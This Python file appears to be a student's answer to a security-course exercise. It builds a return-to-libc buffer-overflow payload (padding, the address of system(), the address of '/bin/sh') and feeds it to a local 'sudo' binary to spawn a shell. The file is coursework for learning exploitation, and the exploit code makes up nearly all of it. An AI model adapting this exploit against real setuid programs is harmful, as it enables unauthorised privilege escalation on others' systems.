import os
import sys
import base64
import addresses
import struct


PATH_TO_SUDO = './sudo'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to open a shell using the return-to-libc
    technique. Make sure to return a `bytes` object and not an `str` object.

    NOTES:
    1. Use `addresses.SYSTEM` to get the address of the `system` function
    2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    
    offset = 135 # calculation is in q1a.txt
    system_address = addresses.SYSTEM
    bin_sh_address = addresses.LIBC_BIN_SH
    
    password = b'a'*offset + struct.pack('<I', system_address) + b'a'*4 + struct.pack('<I', bin_sh_address)
    
    return password


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
